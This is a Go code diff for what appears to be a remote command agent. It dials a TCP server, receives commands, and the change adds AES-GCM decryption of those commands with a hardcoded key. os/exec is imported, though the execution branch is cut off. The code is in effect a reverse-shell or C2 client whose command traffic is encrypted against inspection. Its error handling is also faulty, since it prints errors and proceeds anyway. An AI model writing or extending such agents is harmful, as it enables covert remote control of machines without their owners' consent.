@@ -2,21 +2,51 @@ package main
 
 import (
 	// Standard
-	"strings"
-	"encoding/gob"
-	"net"
 	"crypto/aes"
 	"crypto/cipher"
-	"io/ioutil"
+	"encoding/gob"
+	"fmt"
+	"net"
 	"os/exec"
 	"runtime"
+	"strings"
 )
+
+
+func decrypt(ciphertext []byte) string {
+	key := []byte("passphrasewhichneedstobe32bytes!")
+
+	c, err := aes.NewCipher(key)
+
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	gcm, err := cipher.NewGCM(c)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	nonceSize := gcm.NonceSize()
+
+	if len(ciphertext) < nonceSize {
+		fmt.Println(err)
+	}
+
+	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
+	decCmd, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	return string(decCmd)
+}
 
 
 func main() {
 	conn, err := net.Dial("tcp", "localhost:8080")
 
-	cmd := ""
+	encCmd := []byte("")
 	dec := gob.NewDecoder(conn)
 	enc := gob.NewEncoder(conn)
 
@@ -25,7 +55,8 @@ func main() {
 	}
 
 	cmdLoop:for {
-		dec.Decode(&cmd)
+		dec.Decode(&encCmd)
+		cmd := decrypt(encCmd)
 		cmd = strings.TrimSuffix(cmd, "\n")
 	
 		switch {
